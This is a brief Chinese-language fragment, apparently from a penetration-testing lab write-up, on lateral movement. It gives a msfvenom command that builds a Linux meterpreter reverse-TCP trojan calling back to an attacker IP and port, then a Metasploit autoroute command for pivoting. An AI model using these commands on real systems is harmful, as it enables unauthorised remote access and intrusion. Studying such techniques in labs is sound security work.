横向移动

先上个木马，反弹shell到msf上

msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.50.133 LPORT=4444 -f elf -b '\x00' -o ma.elf

添加一段主机路由，以转发我们的攻击机流量

run autoroute -p
